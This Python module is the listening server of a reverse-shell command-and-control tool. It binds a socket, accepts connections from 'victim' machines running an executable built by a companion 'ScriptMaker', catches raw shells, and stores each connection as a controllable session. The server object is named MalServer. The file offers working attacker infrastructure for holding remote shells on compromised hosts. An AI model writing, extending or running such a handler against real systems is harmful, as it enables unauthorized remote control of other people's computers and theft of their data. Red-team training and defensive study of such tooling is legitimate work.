import threading, requests, socket, random, json
import Sessions, Prompt

def GetNetworkIP():
    try:
        # Create a dummy socket connection to get the IP address
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            # Connect to Google DNS and fetch the first IP
            # encapsulated within the IP Packet
            s.connect(("8.8.8.8", 80))
            return s.getsockname()[0]
    except Exception as e:
        print(f"Error: {e}")
        return None

def GetPublicIP():
    answer = str(input("Are you Comfortable Sending a Request to `https://ipinfo.io/ip`? [y/N] >> "))
    if 'y' in answer.lower() or 'yes' in answer.lower():
        try:
            response = requests.get("https://ipinfo.io/ip")
            response.raise_for_status()
            return response.text.strip()
        except requests.RequestException as e:
            print(f"Error fetching public IP: {e}")
            return None
    else:
        return None
    
def GetIP(ipType: str):
    if ipType == "local":
        print("Getting LAN IP. . .")
        return GetNetworkIP()
    elif ipType == "public":
        print("Getting Public IP. . .")
        return GetPublicIP()
    else:
        print(f"[-] Unknown type: {ipType}")
        return ipType

class ServerConfig:
    def __init__(self, lhost: str, lport: int):
        self.lhost = lhost
        self.lport = lport
        self.capturedSessions = []
        self.sessionThreads = []
        self.serversocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.isActive = False

    def GetLhost(self):
        return self.lhost
    def GetLport(self):
        return self.lport

    def Active(self):
        return self.isActive
    def ReadyShutdown(self):
        print("[*] Sending Shutdown Signal. . .")
        self.isActive = False
        try:
            killSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            killSocket.connect((self.lhost, self.lport))
        except:
            return None
    
    def GetSessions(self):
        return self.capturedSessions
    def AddSession(self, session:Sessions.Session):
        self.capturedSessions.append(session)
    def RemoveSession(self, session:Sessions.Session):
        self.capturedSessions.remove(session)

    def AddSessionThread(self, t):
        self.sessionThreads.append(t)

    def CreateServer(self):
        if not self.isActive:
            self.isActive = True
            self.serversocket.bind((self.GetLhost(), self.GetLport()))
            self.serversocket.listen()

    def GetServer(self):
        return self.serversocket

    def KillSessions(self):
        print("[*] Closing Active Sessions. . .")
        for sess in self.capturedSessions:
            sess.EndSession()

        for t in self.sessionThreads:
            t.join()
        print("[+] Sessions Closed Successfully!")
    
def RunServer(MalServer: ServerConfig, handle: Prompt.HandlerPrompt):
    try:
        handle.WriteToTerminal(f"[*] Attempting to Bind to >> {MalServer.GetLhost()}:{MalServer.GetLport()}")

        MalServer.CreateServer()

        handle.WriteToTerminal(f"[+] Server Active | {MalServer.GetLhost()}:{MalServer.GetLport()}")

        while MalServer.Active():
            connection, address = MalServer.GetServer().accept()

            # Upon connection if the server has been shutdown we skip all connection logic
            # concerning Clients
            if MalServer.Active() == False:
                break

            handle.WriteToTerminal(f"[*] Incoming connection | {address}")
            connection.settimeout(5)

            sessionData = ""
            try:
                # Server recieves victim system information
                # coming from executable from ScriptMaker
                sessionData = json.loads(connection.recv(4096).decode())
            except:
                # captured raw shell (not from executable)
                sessionData = ""

            # Store new Session Connection
            connection.settimeout(None)
            clientSession = Sessions.Session(connection,address,sessionData)
            MalServer.AddSession(clientSession)

        # Shutdown the Socket Server
        MalServer.KillSessions()
        MalServer.GetServer().close()

        print("[*] Server Session Ended!")
    except Exception as e:
        print(f"Error: {e}")